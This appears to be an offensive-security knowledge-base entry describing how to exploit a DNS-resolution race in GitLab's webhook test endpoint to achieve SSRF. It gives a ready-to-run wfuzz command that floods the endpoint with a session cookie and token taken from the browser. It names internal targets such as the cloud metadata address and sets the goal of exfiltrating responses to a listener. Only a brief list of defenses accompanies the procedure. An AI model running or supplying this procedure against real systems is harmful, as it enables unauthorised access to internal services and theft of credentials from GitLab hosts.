---
tags:
  - fuzzing
  - race
  - ssrf
type: procedure
tools:
  - '[[tools/wfuzz]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/wfuzz-webhook-test]]'
  - '[[commands/gitlab-env-info]]'
platforms:
  - Web
  - Linux
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: b4591829-ff5a-437c-bff5-6ac9653bd72a
created_at: '2025-12-14T03:46:09.472Z'
updated_at: '2025-12-14T03:46:09.472Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-Web-Hook-Tests-with-Wfuzz

## Summary

Uses wfuzz to send parallel POST requests to the webhook test endpoint, exploiting the DNS resolution race for SSRF.

## Description

The ToCToU occurs because validation and request use separate DNS lookups. Parallel requests increase chances of allowed IP in validation and blocked (localhost) in request. Requires session cookie and token from browser dev tools.

## Requirements

1. Wfuzz installed
2. GitLab session ID and authenticity token
3. Hook ID from URL
4. Custom DNS active

## Defense

Defensive measures and detection strategies:

- Rate limit webhook tests
- Log and alert on rapid test endpoint hits
- Use fixed DNS caching

## Objectives

1. Bypass URL blocker
2. Achieve SSRF to internal hosts (e.g., 169.254.169.254)
3. Exfiltrate responses via listener

## Instructions

### Step 1: Extract Credentials

**Context**: From browser, get _gitlab_session and authenticity_token.

> Inspect network requests during webhook setup.

### Step 2: Run Fuzzing

**Context**: Flood test endpoint to hit race condition.

**Command** ([[commands/wfuzz-webhook-test]]):
```bash
./wfuzz -X POST -b "_gitlab_session=<session_id>;" -d "_method=post&authenticity_token=<token>" -z range,0-1000 "https://<domain>/<user>/<repo>/hooks/<hook_id>/test?trigger=push_events&test=FUZZ"
```

> Expected output: 1000 requests; some 500s, eventual SSRF success indicated by nc connection.

### Step 3: Verify Environment

**Context**: On server, run for repro details.

**Command** ([[commands/gitlab-env-info]]):
```bash
gitlab-rake gitlab:env:info
```

> Expected output: System info like Ubuntu 18.04, GitLab 11.9.8-ee.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/wfuzz-webhook-test]]
- [[commands/gitlab-env-info]]

## Tools Used

- [[tools/wfuzz]]

## Tags

- [[fuzzing]]
- [[toc2u]]
